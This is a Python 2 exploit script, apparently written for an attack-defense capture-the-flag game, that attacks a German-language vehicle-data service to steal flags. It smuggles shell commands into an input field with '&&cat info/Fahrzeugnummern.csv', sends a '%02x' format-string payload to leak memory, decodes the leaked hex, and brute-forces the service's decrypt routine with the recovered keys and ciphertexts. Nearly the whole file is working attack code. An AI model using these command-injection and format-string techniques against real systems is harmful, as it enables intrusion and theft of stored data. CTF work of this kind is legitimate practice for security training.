import subprocess
import socket
import sys
import time

def execute_shell(command, error=''):
    return subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)

def recv_until(s, text):
    BUFFER_SIZE = 2048
    data = ""
    loop = True
    while loop:
        tmp = s.recv(BUFFER_SIZE)
        if tmp.find(text) != -1: loop = False
        data += tmp
    return data

def exploit(ip, port, flag_id):
    OKBLUE  = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL    = '\033[91m'
    ENDC    = '\033[0m'

    flagID1 = flag_id[:6]
    flagID2 = flag_id[6:]

    keys    = []
    encr    = []
    flags   = []

    BUFFER_SIZE = 2048
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    data = recv_until(s, "Fahrgsteinumma ei:\n")

    print OKBLUE + "[*] Trying to get flag part 1" + ENDC

    s.send("AAVZZZ53178207512&&cat info/Fahrzeugnummern.csv&&cat info/Fahrzeugnummern.csv\n")
    data = recv_until(s, "Emmissionswert")

    for line in data.splitlines():
        if line.startswith(flagID1):
            keys.append(line.split(";")[1])

    print OKGREEN + "[+] Found " + str(len(keys)) + " possible part/atoms" + ENDC
    #------------------------------------------------------------------------------#
    print OKBLUE + "[*] Trying to get flag part 2" + ENDC

    s.send("I ko koa bayrisch\n")
    data = recv_until(s, "sie wissen?\n")

    bayWord = "ASDASD"

    s.send(bayWord + "%02x"*100 + bayWord+"\n")
    data = recv_until(s, "deutsch.\n")

    entries =  data.splitlines()[1].split("ASDASD")[1].split("32343234")
    entries.remove(entries[0])

    chunks, chunk_size = len(entries[0]), 2#len(entries[0])//4
    tmp = []

    for ent in entries:
        tmp2 = [ ent[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
        tmp.append(tmp2)

    lines = []
    for elem in tmp:
        tmp2 = ""
        for c in elem:
            try:
                tmp2 = chr(int(c, 16)) + tmp2
            except ValueError:
                pass
        lines.append(tmp2)

    for line in lines:
        if line.startswith(flagID2):
            encr.append(line.split(";")[1][:-1])

    print OKGREEN + "[+] Found " + str(len(encr)) + " possible part/s" + ENDC

    print(keys)
    print(encr)

    s.send("exit\n")
    data = recv_until(s, "Fahrgsteinumma ei:\n")
    s.send("decrypt\n")
    data = recv_until(s, "entschluesseln?\n")

    for key in keys:
        for en in encr:
            s.send(key + " " + en + "\n")
            data = recv_until(s, "entschluesseln?\n")
            if not data.startswith("FLG"):
                print FAIL + "[-] Found false flag "+ data.split("\n")[0] + ENDC
            else:
                print OKGREEN + "[+] Possible Flag: " + data.split("\n")[0] + ENDC
                flags.append(data)

    s.close()

    if len(flags) > 0:
        print OKGREEN + "[+] Done" + ENDC
        return { 'FLAG': flags[0].split("\n")[0] } # 0 for the specification, normally the first one should be the right one..
    else:
        print FAIL + "[-] Done, no flag found.." + ENDC

if __name__ == "__main__":
    ip      = sys.argv[1]
    port    = int(sys.argv[2])
    flag_id  = sys.argv[3]

    exploit(ip, port, flag_id)
